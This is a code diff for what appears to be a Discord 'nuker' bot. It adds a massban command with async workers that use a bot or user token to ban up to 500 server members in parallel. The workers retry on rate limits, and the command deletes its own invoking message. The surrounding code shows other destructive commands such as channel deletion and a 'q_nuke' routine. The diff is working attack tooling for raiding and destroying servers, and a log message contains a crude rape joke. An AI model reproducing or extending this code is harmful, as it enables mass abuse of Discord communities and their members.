@@ -56,8 +56,7 @@ else:
                 "authorization": f"Bot {usertoken}"
                 }
     except:
-        pass
-
+        pass 
 
 checkweb = False
 proxies = proxygen.get_proxies()
@@ -112,6 +111,32 @@ async def deletechannels_worker(queue):
             else:
                 print(e)
 
+
+
+async def banmember_worker(queue, guild):
+    async with aiohttp.ClientSession() as session:
+        while True:
+            try:
+                userid = queue.get_nowait()
+                guildID = guild.id
+                request = await session.put(f'https://discordapp.com/api/v9/guilds/{guildID}/bans/{userid}', headers=headers)
+                if request.status == 204: 
+                    queue.task_done()
+                elif request.status == 429:
+                    json = await request.json()
+                    print("Rape limited")
+                    await asyncio.sleep(json['retry_after'])
+                    queue.put_nowait(userid)
+                elif request.status in [401, 404, 403]:
+                    return
+            except Exception as e:
+                if isinstance(e, asyncio.QueueEmpty):
+                    await session.close()
+                    return
+                elif 'Cannot connect to host discordapp.com:443 ssl:default [Name or service not known]' in str(e):
+                    queue.put_nowait(userid)
+                else:
+                    print(e)
 
 thechans = []
 @slayer.command()
@@ -211,6 +236,32 @@ async def lastcheck(ctx):
                 pass
 
 #########################################################################################
+
+
+@slayer.command()
+async def massban(ctx):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    queue = asyncio.Queue()
+    toprole = ctx.guild.me.top_role
+    members = await ctx.guild.chunk()
+    for member in members[:500]:
+        if toprole.position > member.top_role.position and member.id != slayer.user.id and member.id != ctx.guild.owner.id or slayer.user.id == ctx.guild.owner.id:
+            queue.put_nowait(member.id)
+        else:
+            for member in members:
+                if toprole.position > member.top_role.position and member.id != slayer.user.id and member.id != ctx.guild.owner.id or slayer.user.id == ctx.guild.owner.id:
+                    queue.put_nowait(member.id)       
+    tasks = []
+    for x in range(5):
+        task = asyncio.create_task(banmember_worker(queue, ctx.guild))
+        tasks.append(task)
+    await queue.join()
+    for task in tasks:
+        task.cancel()
+
 
 @slayer.command()
 async def load(ctx, ID):
@@ -689,6 +740,7 @@ async def q_nuke(ctx):
         asyncio.gather(*roletasks)
     except:
         pass
+
 
 
 
